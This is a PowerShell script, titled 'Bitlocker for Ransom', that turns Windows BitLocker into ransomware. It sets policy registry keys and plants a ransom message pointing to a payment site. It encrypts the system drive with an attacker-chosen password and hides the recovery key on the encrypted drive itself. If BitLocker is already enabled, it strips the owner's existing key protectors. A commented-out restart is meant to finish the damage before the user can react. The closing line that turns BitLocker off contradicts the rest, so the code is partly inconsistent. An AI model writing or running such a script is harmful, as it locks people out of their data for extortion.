#Set Execution Policy to allow script to run
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore

#Bitlocker for Ransom


#Is Bitlocker already enabled on the system drive
$Check = (get-bitlockervolume -mountpoint $ENV:SystemDrive)
$Status = $Check.ProtectionStatus
if($Status -eq 'Off'){echo 'Bitlocker NOT Enabled on System Drive'}
if($Status -eq 'On'){echo 'Bitlocker IS Enabled on System Drive'}

#Set registry first
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseAdvancedStartup /t REG_DWORD /d 1 /f
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPM /t REG_DWORD /d 2 /f
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMKey /t REG_DWORD /d 2 /f
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMKeyPIN /t REG_DWORD /d 2 /f

#Change the recovery message to meet your needs. In my example I put a fake website where the victim can come and pay for their password

REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v RecoveryKeyMessage /t REG_SZ /d 'please Visit my hacker site https://yourscrewed.hahaha to give me money' /f
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /V RecoveryKeyMessageSource /t REG_DWORD /d 2 /f
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMPIN /t REG_DWORD /d 2 /f

#Use a Strong Password Here!
$PlainPassword = "P@ssw0rd"
$SecurePassword = $PlainPassword | ConvertTo-SecureString -AsPlainText -Force 



if($Status -eq 'Off'){

#Enable Bitlocker, Encrypt the used space on the C: drive
enable-bitlocker -EncryptionMethod Aes256 -password $securepassword -mountpoint $ENV:SystemDrive  -PasswordProtector -skiphardwaretest -UsedSpaceOnly


#To use the Custom Recovery Screen, there must be a recovery key created. I dont want to use the recovery key, so I put it on the encrypted C: drive so it is inaccessable.
add-bitlockerkeyprotector -mountpoint $ENV:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\

#Uncomment to restart the Computer ASAP so that the damage is done before the user can undo it. I dont do this by default
#restart-computer

}

#If Bitlocker is already enabled on the systemd drive. The following will execute, removing all passwords and recovery keys. Then adding my own passwords and keys just like before.
if ($Status -eq 'On'){
#Strip all Passwords and Recovery keys (Not yet Tested with TPM)
$IDS = $check.KeyProtector.KeyProtectorID
foreach($ID in $IDS){
Remove-BitlockerKeyProtector -Mountpoint $ENV:SystemDrive -KeyProtectorID $ID
}
add-bitlockerkeyprotector -mountpoint $ENV:SystemDrive -PasswordProtector -Password $securepassword
add-bitlockerkeyprotector -mountpoint $ENV:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\
Resume-Bitlocker -MountPoint $ENV:SystemDrive
}
manage-bde -off $ENV:SystemDrive